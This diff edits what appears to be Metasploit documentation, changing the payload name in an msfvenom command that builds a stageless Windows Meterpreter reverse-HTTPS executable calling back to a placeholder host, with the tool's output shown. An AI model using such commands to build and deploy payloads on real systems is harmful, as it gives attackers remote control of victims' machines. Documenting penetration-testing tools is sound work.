@@ -26,7 +26,7 @@ $ head launch-paranoid.bat
 A stageless version of this would look like the following:
 
 ```
-$ ./msfvenom -p windows/meterpreter_reverse_https LHOST=www.example.com LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=./www.example.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f exe -o launch-paranoid-stageless.exe
+$ ./msfvenom -p windows/meterpreter_reverse_https LHOST=www.example.com LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=./www.example.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless -f exe -o launch-paranoid-stageless.exe
 No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 No Arch selected, selecting Arch: x86 from the payload
 No encoder or badchars specified, outputting raw payload
